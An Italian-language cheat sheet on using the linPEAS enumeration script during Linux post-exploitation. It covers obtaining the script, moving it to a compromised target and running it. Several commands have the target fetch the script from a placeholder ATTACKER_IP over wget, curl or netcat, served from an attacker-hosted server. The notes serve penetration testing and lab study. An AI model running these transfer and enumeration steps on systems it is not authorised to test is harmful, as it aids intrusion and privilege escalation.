# 🪙 linPEAS – Linux Privilege Escalation

Appunti e snippet per usare **linPEAS** nella fase di **post-exploitation** su sistemi Linux.

## 📌 Obiettivi

* Automatizzare la ricerca di possibili vettori di **Privilege Escalation**.
* Identificare configurazioni deboli, binari SUID, cronjob, capabilities e kernel exploit suggeriti.
* Ottenere una panoramica rapida di ciò che è sfruttabile.

---

## 📥 Ottenere linPEAS

Repo ufficiale: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

Scaricare la release:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

---

## 🔄 Trasferire su macchina target

### Con **wget/curl** (se target ha internet)

```bash
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
# oppure
curl http://ATTACKER_IP/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

➡️ Prima devi hostare il file in locale:

```bash
python3 -m http.server 80
```

---

### Con **scp** (se hai SSH)

```bash
scp linpeas.sh user@target:/tmp/linpeas.sh
```

---

### Con **netcat**

**Attacker (send):**

```bash
nc -lvnp 1234 < linpeas.sh
```

**Target (receive):**

```bash
nc ATTACKER_IP 1234 > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

---

## ▶️ Esecuzione

```bash
./linpeas.sh
```

Con output colorato (più leggibile):

```bash
./linpeas.sh -a
```

Se vuoi loggarlo:

```bash
./linpeas.sh | tee linpeas_report.txt
```

---

## 📚 Risorse utili

* [linPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
* [HackTricks PEAS Guide](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/peas)
* [GTFOBins](https://gtfobins.github.io/) (per sfruttare i binari segnalati)

---
